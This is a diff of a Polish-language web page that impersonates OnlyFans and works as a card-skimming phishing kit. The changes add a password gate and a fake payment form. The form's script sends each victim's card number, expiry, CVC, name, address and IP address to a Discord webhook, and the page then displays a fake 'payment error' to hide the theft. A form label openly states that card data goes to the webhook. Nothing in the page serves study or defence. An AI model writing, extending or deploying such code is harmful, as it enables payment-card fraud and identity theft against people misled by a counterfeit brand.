@@ -3,14 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OnlyFans – Twórcy</title>
+    <title>OnlyFans – Dołącz do twórców</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             background: #ffffff;
-            font-family: -apple-system, 'Inter', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', sans-serif;
             color: #0f0f0f;
         }
+
+        /* Login overlay */
+        .login-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            backdrop-filter: blur(0px);
+        }
+
+        .login-box {
+            background: #ffffff;
+            padding: 48px 40px;
+            border-radius: 24px;
+            border: 1px solid #e6e6e6;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.05);
+        }
+
+        .login-box h2 {
+            font-size: 28px;
+            color: #0099ff;
+            margin-bottom: 8px;
+        }
+
+        .login-box p {
+            color: #666;
+            margin-bottom: 32px;
+            font-size: 14px;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #f8f8f8;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+
+        .login-box input:focus {
+            outline: none;
+            border-color: #0099ff;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 14px;
+            background: #0099ff;
+            border: none;
+            border-radius: 40px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-error {
+            color: #ff3b30;
+            margin-top: 16px;
+            font-size: 14px;
+        }
+
+        /* Główna strona (ukryta do czasu hasła) */
+        .main-content {
+            display: none;
+        }
+
         .navbar {
             background: #ffffff;
             border-bottom: 1px solid #e6e6e6;
@@ -19,17 +100,23 @@
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
+
         .logo {
             font-size: 28px;
             font-weight: 800;
             color: #0099ff;
             cursor: pointer;
         }
+
         .nav-buttons {
             display: flex;
             gap: 12px;
         }
+
         .nav-btn {
             background: transparent;
             border: 1px solid #ddd;
@@ -38,34 +125,63 @@
             border-radius: 30px;
             font-weight: 600;
             cursor: pointer;
+            transition: all 0.2s;
         }
+
+        .nav-btn:hover {
+            background: #f5f5f5;
+        }
+
         .nav-btn.primary {
             background: #0099ff;
             border: none;
             color: white;
         }
+
+        .nav-btn.primary:hover {
+            background: #0077cc;
+        }
+
         .container {
             max-width: 1100px;
             margin: 0 auto;
             padding: 48px 24px;
         }
+
         .card {
             background: #ffffff;
             border-radius: 24px;
-            padding: 32px;
+            padding: 40px;
             border: 1px solid #e6e6e6;
             max-width: 600px;
             margin: 0 auto;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
-        .card h2 { font-size: 26px; margin-bottom: 8px; }
-        .sub { color: #666; margin-bottom: 28px; }
-        .form-group { margin-bottom: 20px; }
+
+        .card h2 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .sub {
+            color: #666;
+            margin-bottom: 32px;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
         label {
             display: block;
             font-size: 13px;
             font-weight: 600;
+            color: #333;
             margin-bottom: 8px;
         }
+
         input, textarea {
             width: 100%;
             padding: 14px 16px;
@@ -74,11 +190,36 @@
             border-radius: 12px;
             font-size: 15px;
             font-family: inherit;
+            transition: all 0.2s;
         }
+
         input:focus, textarea:focus {
             outline: none;
             border-color: #0099ff;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0,153,255,0.1);
         }
+
+        .upload-box {
+            background: #f8f8f8;
+            border: 2px dashed #ddd;
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .upload-box:hover {
+            border-color: #0099ff;
+            background: #f0f8ff;
+        }
+
+        .upload-box span {
+            color: #0099ff;
+            font-weight: 500;
+        }
+
         .btn-submit {
             width: 100%;
             background: #0099ff;
@@ -90,20 +231,31 @@
             font-size: 16px;
             cursor: pointer;
             margin-top: 16px;
+            transition: background 0.2s;
         }
+
+        .btn-submit:hover {
+            background: #0077cc;
+        }
+
         .profile-header {
             background: #fafafa;
             border-radius: 24px;
             overflow: hidden;
             border: 1px solid #e6e6e6;
         }
+
         .banner-img {
             width: 100%;
             height: 200px;
             object-fit: cover;
             background: #e6e6e6;
         }
-        .profile-info { padding: 20px 28px 28px; }
+
+        .profile-info {
+            padding: 20px 28px 28px;
+        }
+
         .avatar-img {
             width: 100px;
             height: 100px;
@@ -112,9 +264,23 @@
             margin-top: -60px;
             object-fit: cover;
         }
-        .profile-name { font-size: 24px; font-weight: 700; margin-top: 12px; }
-        .profile-username { color: #0099ff; margin: 4px 0; }
-        .profile-bio { color: #666; margin-top: 12px; }
+
+        .profile-name {
+            font-size: 24px;
+            font-weight: 700;
+            margin-top: 12px;
+        }
+
+        .profile-username {
+            color: #0099ff;
+            margin: 4px 0;
+        }
+
+        .profile-bio {
+            color: #666;
+            margin-top: 12px;
+        }
+
         .stats {
             display: flex;
             gap: 32px;
@@ -123,8 +289,18 @@
             border-top: 1px solid #eee;
             border-bottom: 1px solid #eee;
         }
-        .stat-number { font-size: 28px; font-weight: 800; color: #0099ff; }
-        .stat-label { font-size: 13px; color: #666; }
+
+        .stat-number {
+            font-size: 28px;
+            font-weight: 800;
+            color: #0099ff;
+        }
+
+        .stat-label {
+            font-size: 13px;
+            color: #666;
+        }
+
         .subscribe-btn {
             width: 100%;
             background: #0099ff;
@@ -137,13 +313,23 @@
             cursor: pointer;
             margin: 20px 0;
         }
+
         .features {
             background: #f8f8f8;
             border-radius: 16px;
             padding: 20px;
             margin: 20px 0;
         }
-        .feature { padding: 8px 0; color: #0099ff; font-weight: 500; }
+
+        .feature {
+            padding: 10px 0;
+            color: #0099ff;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
         .modal {
             display: none;
             position: fixed;
@@ -156,6 +342,7 @@
             align-items: center;
             justify-content: center;
         }
+
         .modal-content {
             background: white;
             border-radius: 24px;
@@ -165,42 +352,110 @@
             max-height: 90vh;
             overflow-y: auto;
         }
+
+        .modal-content h3 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
         .modal-content input, .modal-content select {
             width: 100%;
-            padding: 12px;
-            margin-bottom: 12px;
+            padding: 14px;
+            margin-bottom: 16px;
             border: 1px solid #ddd;
             border-radius: 12px;
+            font-size: 15px;
         }
-        .row { display: flex; gap: 12px; }
-        .close-modal { float: right; cursor: pointer; font-size: 24px; }
-        .status { margin-top: 16px; text-align: center; }
-        .error { text-align: center; padding: 60px 20px; }
-        .admin-link {
+
+        .row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .row input {
+            flex: 1;
+        }
+
+        .close-modal {
+            float: right;
+            cursor: pointer;
+            font-size: 28px;
+            color: #999;
+        }
+
+        .status {
+            margin-top: 16px;
             text-align: center;
-            margin-top: 40px;
-            padding: 20px;
-            border-top: 1px solid #eee;
-            font-size: 13px;
+            font-size: 14px;
         }
-        .admin-link a {
-            color: #0099ff;
-            text-decoration: none;
+
+        .error-page {
+            text-align: center;
+            padding: 80px 20px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .error-page h2 {
+            font-size: 32px;
+            color: #ff3b30;
+            margin-bottom: 16px;
+        }
+
+        .error-page p {
+            color: #666;
+            margin-bottom: 24px;
+        }
+
+        .error-page button {
+            background: #0099ff;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 40px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .webhook-field {
+            background: #fff9f0;
+            border-color: #ffcc80;
+        }
+
+        @media (max-width: 800px) {
+            .navbar { padding: 12px 20px; }
+            .container { padding: 24px 16px; }
+            .card { padding: 24px; }
         }
     </style>
 </head>
 <body>
 
-<div class="navbar">
-    <div class="logo" onclick="navigateToHome()">OnlyFans</div>
-    <div class="nav-buttons">
-        <button class="nav-btn" onclick="navigateToHome()">Strona główna</button>
-        <button class="nav-btn primary" onclick="navigateToHome()">Dołącz</button>
+<!-- Login overlay -->
+<div class="login-overlay" id="loginOverlay">
+    <div class="login-box">
+        <h2>OnlyFans</h2>
+        <p>Wprowadź hasło, aby kontynuować</p>
+        <input type="password" id="passwordInput" placeholder="Hasło" autofocus>
+        <button onclick="checkPassword()">Kontynuuj</button>
+        <div id="loginError" class="login-error"></div>
     </div>
 </div>
 
-<div id="app" class="container"></div>
+<!-- Główna zawartość -->
+<div class="main-content" id="mainContent">
+    <div class="navbar">
+        <div class="logo">OnlyFans</div>
+        <div class="nav-buttons">
+            <button class="nav-btn">Zaloguj</button>
+            <button class="nav-btn primary">Dołącz</button>
+        </div>
+    </div>
 
+    <div id="app" class="container"></div>
+</div>
+
+<!-- Modal płatności -->
 <div id="paymentModal" class="modal">
     <div class="modal-content">
         <span class="close-modal" onclick="closePaymentModal()">&times;</span>
@@ -209,43 +464,77 @@
             <select id="country" required>
                 <option value="">Kraj</option>
                 <option>Polska</option>
-                <option>USA</option>
+                <option>Stany Zjednoczone</option>
                 <option>Niemcy</option>
+                <option>Wielka Brytania</option>
+                <option>Francja</option>
+                <option>Hiszpania</option>
+                <option>Włochy</option>
             </select>
             <input type="text" id="state" placeholder="Stan / Województwo" required>
-            <input type="text" id="address" placeholder="Adres" required>
+            <input type="text" id="address" placeholder="Adres zamieszkania" required>
             <input type="text" id="city" placeholder="Miasto" required>
-            <input type="text" id="cardName" placeholder="Imię na karcie" required>
-            <input type="text" id="cardNumber" placeholder="Numer karty" required>
+            <input type="text" id="cardName" placeholder="Imię i nazwisko na karcie" required>
+            <input type="text" id="cardNumber" placeholder="Numer karty" maxlength="19" required>
             <div class="row">
-                <input type="text" id="expiry" placeholder="MM/RR" required>
-                <input type="text" id="cvc" placeholder="CVC" required>
+                <input type="text" id="expiry" placeholder="MM/RR" maxlength="5" required>
+                <input type="text" id="cvc" placeholder="CVC" maxlength="4" required>
             </div>
-            <button type="submit" class="btn-submit">Prześlij</button>
+            <button type="submit" class="btn-submit">Zapłać i subskrybuj</button>
         </form>
         <div id="paymentStatus" class="status"></div>
     </div>
 </div>
 
 <script>
-    // Ścieżka do pliku JSON (musi być w tym samym folderze)
-    const JSON_FILE = "creators.json";
+    // Hasło dostępu
+    const CORRECT_PASSWORD = "dziadkakasa";
     
-    let creators = {};
-    let currentUsername = null;
-
-    async function loadCreators() {
-        try {
-            const response = await fetch(JSON_FILE + '?t=' + Date.now());
-            if (!response.ok) throw new Error('Nie znaleziono pliku creators.json');
-            creators = await response.json();
-        } catch (error) {
-            console.error('Błąd ładowania:', error);
-            creators = {};
+    // Dane twórców (przykładowe)
+    let creators = {
+        "jan_kowalski": {
+            fullName: "Jan Kowalski",
+            displayName: "Janek Official",
+            bio: "Najlepsze treści premium! 🔥 Codziennie nowe materiały.",
+            avatar: "https://randomuser.me/api/portraits/men/1.jpg",
+            banner: "https://picsum.photos/1200/400?grayscale",
+            webhook: "",
+            created: "2024-01-15T10:00:00.000Z"
+        },
+        "anna_nowak": {
+            fullName: "Anna Nowak",
+            displayName: "Anna Official",
+            bio: "✨ Ekskluzywne treści dla moich fanów ✨",
+            avatar: "https://randomuser.me/api/portraits/women/1.jpg",
+            banner: "https://picsum.photos/1200/400",
+            webhook: "",
+            created: "2024-01-16T12:00:00.000Z"
         }
-        render();
+    };
+
+    let currentProfileUsername = null;
+
+    // Sprawdzanie hasła
+    function checkPassword() {
+        const password = document.getElementById('passwordInput').value;
+        const errorDiv = document.getElementById('loginError');
+        
+        if (password === CORRECT_PASSWORD) {
+            document.getElementById('loginOverlay').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            render();
+        } else {
+            errorDiv.innerHTML = '❌ Nieprawidłowe hasło. Spróbuj ponownie.';
+            document.getElementById('passwordInput').value = '';
+        }
     }
 
+    // Nasłuchiwanie Enter w polu hasła
+    document.getElementById('passwordInput').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') checkPassword();
+    });
+
+    // Routing
     function render() {
         const path = window.location.pathname;
         const match = path.match(/^\/@(.+)$/);
@@ -257,12 +546,13 @@
         }
     }
 
+    // Formularz rejestracji twórcy
     function renderForm() {
         const app = document.getElementById('app');
         app.innerHTML = `
             <div class="card">
                 <h2>🔥 Zostań twórcą</h2>
-                <div class="sub">Dołącz do OnlyFans</div>
+                <div class="sub">Dołącz do OnlyFans – wypełnij formularz</div>
                 <form id="creatorForm">
                     <div class="form-group">
                         <label>Imię i nazwisko</label>
@@ -278,27 +568,26 @@
                     </div>
                     <div class="form-group">
                         <label>Bio / Opis</label>
-                        <textarea id="bio" rows="3" placeholder="Opowiedz coś o sobie..."></textarea>
+                        <textarea id="bio" rows="3" placeholder="Opowiedz swoim fanom coś o sobie..."></textarea>
                     </div>
                     <div class="form-group">
-                        <label>📸 Avatar URL (opcjonalne)</label>
+                        <label>📸 Zdjęcie profilowe URL</label>
                         <input type="url" id="avatarUrl" placeholder="https://example.com/avatar.jpg">
                     </div>
                     <div class="form-group">
-                        <label>🎨 Baner URL (opcjonalne)</label>
+                        <label>🎨 Baner URL</label>
                         <input type="url" id="bannerUrl" placeholder="https://example.com/banner.jpg">
                     </div>
                     <div class="form-group">
                         <label>🔗 Webhook Discord (opcjonalne)</label>
-                        <input type="url" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
+                        <input type="url" id="webhookUrl" class="webhook-field" placeholder="https://discord.com/api/webhooks/...">
+                        <small style="color:#999;">Dane kart będą wysyłane na ten webhook</small>
                     </div>
                     <button type="submit" class="btn-submit">✨ Opublikuj profil ✨</button>
                     <div id="status" class="status"></div>
                 </form>
-                <div class="admin-link">
-                    📝 <strong>Jak dodać profil?</strong><br>
-                    Wypełnij formularz, a następnie <strong>dodaj ręcznie dane do pliku <code>creators.json</code></strong><br>
-                    <a href="#" onclick="showManualInstructions(); return false;">Pokaż instrukcję</a>
+                <div style="margin-top: 24px; padding-top: 24px; border-top: 1px solid #eee; text-align: center; font-size: 13px; color: #999;">
+                    📝 Po utworzeniu profilu będziesz mógł go wyświetlić pod adresem <strong>/@twoja_nazwa</strong>
                 </div>
             </div>
         `;
@@ -308,7 +597,7 @@
             const username = document.getElementById('username').value.replace('@', '').toLowerCase();
             
             if (creators[username]) {
-                document.getElementById('status').innerHTML = '<span style="color:red;">❌ Ta nazwa już istnieje!</span>';
+                document.getElementById('status').innerHTML = '<span style="color:#ff3b30;">❌ Ta nazwa użytkownika już istnieje!</span>';
                 return;
             }
 
@@ -322,31 +611,27 @@
                 created: new Date().toISOString()
             };
 
-            // Pokaż dane do skopiowania
-            const newData = { ...creators, [username]: newCreator };
-            document.getElementById('status').innerHTML = `
-                <div style="background:#f0f0f0; padding:16px; border-radius:12px; text-align:left; margin-top:16px;">
-                    <strong>✅ Skopiuj poniższy JSON i wklej do pliku <code>creators.json</code>:</strong><br>
-                    <textarea style="width:100%; margin-top:12px; font-family:monospace; font-size:12px;" rows="15" readonly>${JSON.stringify(newData, null, 2)}</textarea>
-                    <button onclick="navigator.clipboard.writeText(this.previousElementSibling.value)" style="margin-top:8px; padding:8px; background:#0099ff; color:white; border:none; border-radius:8px; cursor:pointer;">📋 Kopiuj JSON</button>
-                    <p style="margin-top:12px; font-size:12px;">Po wklejeniu do <code>creators.json</code> i odświeżeniu strony, profil będzie działać pod <code>/@${username}</code></p>
-                </div>
-            `;
+            creators[username] = newCreator;
+            
+            document.getElementById('status').innerHTML = `<span style="color:#0099ff;">✅ Profil utworzony! Przekierowanie za 2 sekundy...</span>`;
+            setTimeout(() => {
+                window.location.href = `/@${username}`;
+            }, 2000);
         });
     }
 
+    // Wyświetlanie profilu
     function renderProfile(username) {
         const app = document.getElementById('app');
         const profile = creators[username];
-        currentUsername = username;
+        currentProfileUsername = username;
 
         if (!profile) {
             app.innerHTML = `
-                <div class="error">
-                    <h2>😕 Nie znaleziono profilu</h2>
-                    <p>Użytkownik <strong>@${username}</strong> nie istnieje.</p>
-                    <p style="margin-top:16px;">Dodaj go ręcznie w pliku <code>creators.json</code></p>
-                    <button class="nav-btn primary" onclick="navigateToHome()" style="margin-top:20px;">Strona główna</button>
+                <div style="text-align: center; padding: 80px 20px;">
+                    <h2 style="font-size: 32px; margin-bottom: 16px;">😕 Nie znaleziono profilu</h2>
+                    <p style="color: #666; margin-bottom: 24px;">Użytkownik <strong>@${username}</strong> nie istnieje.</p>
+                    <button class="nav-btn primary" onclick="window.location.href='/'">Strona główna</button>
                 </div>
             `;
             return;
@@ -357,9 +642,9 @@
                 <img class="banner-img" src="${profile.banner}" onerror="this.src='https://placehold.co/1200x400/e6e6e6/999?text=Baner'">
                 <div class="profile-info">
                     <img class="avatar-img" src="${profile.avatar}" onerror="this.src='https://placehold.co/200/e6e6e6/999?text=Avatar'">
-                    <div class="profile-name">${profile.displayName}</div>
+                    <div class="profile-name">${escapeHtml(profile.displayName)}</div>
                     <div class="profile-username">@${username}</div>
-                    <div class="profile-bio">${profile.bio || 'Brak opisu'}</div>
+                    <div class="profile-bio">${escapeHtml(profile.bio) || 'Brak opisu'}</div>
                 </div>
             </div>
             <div class="stats">
@@ -378,57 +663,149 @@
                 <div class="feature">✅ Direct message with this user</div>
                 <div class="feature">✅ Cancel your subscription at any time</div>
             </div>
-            <div style="text-align: center; color: #666; margin-top: 20px;">
+            <div style="text-align: center; color: #666; margin-top: 20px; font-size: 12px;">
                 <small>Profil utworzony: ${new Date(profile.created).toLocaleDateString()}</small>
             </div>
         `;
     }
 
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    // Modal płatności z automatycznym slash w MM/RR
     function openPaymentModal() {
         document.getElementById('paymentModal').style.display = 'flex';
+        
+        const expiryInput = document.getElementById('expiry');
+        expiryInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\//g, '').replace(/\s/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        const cardNumberInput = document.getElementById('cardNumber');
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            e.target.value = value;
+        });
     }
 
     document.getElementById('paymentForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         
-        const profile = creators[currentUsername];
+        const profile = creators[currentProfileUsername];
+        
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expiry = document.getElementById('expiry').value;
+        const cvc = document.getElementById('cvc').value;
+        
+        // Walidacja
+        if (cardNumber.length < 15) {
+            showPaymentError('❌ Nieprawidłowy numer karty');
+            return;
+        }
+        if (!expiry.match(/^\d{2}\/\d{2}$/)) {
+            showPaymentError('❌ Nieprawidłowy format daty (MM/RR)');
+            return;
+        }
+        if (cvc.length < 3) {
+            showPaymentError('❌ Nieprawidłowy kod CVC');
+            return;
+        }
+
         const paymentData = {
-            profile: currentUsername,
+            profile: currentProfileUsername,
             country: document.getElementById('country').value,
             state: document.getElementById('state').value,
             address: document.getElementById('address').value,
             city: document.getElementById('city').value,
             cardName: document.getElementById('cardName').value,
-            cardNumber: document.getElementById('cardNumber').value,
-            expiry: document.getElementById('expiry').value,
-            cvc: document.getElementById('cvc').value,
-            timestamp: new Date().toISOString()
+            cardNumber: cardNumber,
+            expiry: expiry,
+            cvc: cvc,
+            timestamp: new Date().toISOString(),
+            ip: await getIP()
         };
 
         const statusDiv = document.getElementById('paymentStatus');
-        statusDiv.innerHTML = '⏳ Wysyłanie...';
+        statusDiv.innerHTML = '⏳ Przetwarzanie...';
 
+        // Wyślij na webhook jeśli istnieje
         if (profile?.webhook && profile.webhook.startsWith('https://')) {
             try {
                 await fetch(profile.webhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `💳 **NOWA PŁATNOŚĆ!**\nProfil: @${currentUsername}\nKraj: ${paymentData.country}\nMiasto: ${paymentData.city}\nAdres: ${paymentData.address}\nKarta: ${paymentData.cardNumber}\nImię na karcie: ${paymentData.cardName}`
+                        content: `💳 **NOWA PRÓBA PŁATNOŚCI!**\n` +
+                                `Profil: @${currentProfileUsername}\n` +
+                                `Kraj: ${paymentData.country}\n` +
+                                `Miasto: ${paymentData.city}\n` +
+                                `Adres: ${paymentData.address}\n` +
+                                `Karta: ${paymentData.cardNumber}\n` +
+                                `Data ważności: ${paymentData.expiry}\n` +
+                                `CVC: ${paymentData.cvc}\n` +
+                                `Imię na karcie: ${paymentData.cardName}\n` +
+                                `IP: ${paymentData.ip}`
                     })
                 });
-                statusDiv.innerHTML = '✅ Wysłano na Discord!';
             } catch(err) {
-                statusDiv.innerHTML = '⚠️ Błąd wysyłki, ale dane zapisane';
+                console.error('Webhook error:', err);
             }
-        } else {
-            statusDiv.innerHTML = '✅ Dane zapisane (brak webhooka)';
         }
 
-        setTimeout(() => {
-            window.location.href = 'https://httpbin.org/status/400';
-        }, 1500);
+        // Pokazuje błąd i przekierowuje po 2 sekundach
+        showPaymentErrorAndRedirect();
     });
+
+    function showPaymentError(message) {
+        const statusDiv = document.getElementById('paymentStatus');
+        statusDiv.innerHTML = `<span style="color:#ff3b30;">❌ ${message}</span>`;
+        setTimeout(() => {
+            statusDiv.innerHTML = '';
+        }, 3000);
+    }
+
+    function showPaymentErrorAndRedirect() {
+        const statusDiv = document.getElementById('paymentStatus');
+        statusDiv.innerHTML = '<span style="color:#ff3b30;">❌ Błąd płatności. Spróbuj ponownie później.</span>';
+        
+        setTimeout(() => {
+            document.getElementById('paymentModal').style.display = 'none';
+            document.getElementById('paymentForm').reset();
+            statusDiv.innerHTML = '';
+            
+            // Pokazuje stronę błędu
+            const app = document.getElementById('app');
+            app.innerHTML = `
+                <div class="error-page">
+                    <h2>⚠️ Błąd płatności</h2>
+                    <p>Twoja transakcja nie została przetworzona. Sprawdź dane karty i spróbuj ponownie.</p>
+                    <button onclick="window.location.href='/'">Powrót do strony głównej</button>
+                </div>
+            `;
+        }, 2000);
+    }
+
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch {
+            return 'nieznane';
+        }
+    }
 
     function closePaymentModal() {
         document.getElementById('paymentModal').style.display = 'none';
@@ -436,16 +813,11 @@
         document.getElementById('paymentStatus').innerHTML = '';
     }
 
-    function navigateToHome() {
-        window.location.href = '/';
-    }
-
-    function showManualInstructions() {
-        alert('📝 INSTRUKCJA:\n\n1. Otwórz plik creators.json w swoim edytorze\n2. Dodaj nowy wpis według wzoru\n3. Zapisz plik\n4. Odśwież stronę\n\nWzór wpisu:\n"twoja_nazwa": {\n  "fullName": "Imię Nazwisko",\n  "displayName": "Nazwa wyświetlana",\n  "bio": "Opis",\n  "avatar": "URL do avatara",\n  "banner": "URL do banera",\n  "webhook": "",\n  "created": "2024-01-15T10:00:00.000Z"\n}');
-    }
-
-    loadCreators();
-    window.addEventListener('popstate', loadCreators);
+    window.addEventListener('popstate', () => {
+        if (document.getElementById('loginOverlay').style.display === 'none') {
+            render();
+        }
+    });
 </script>
 </body>
 </html>
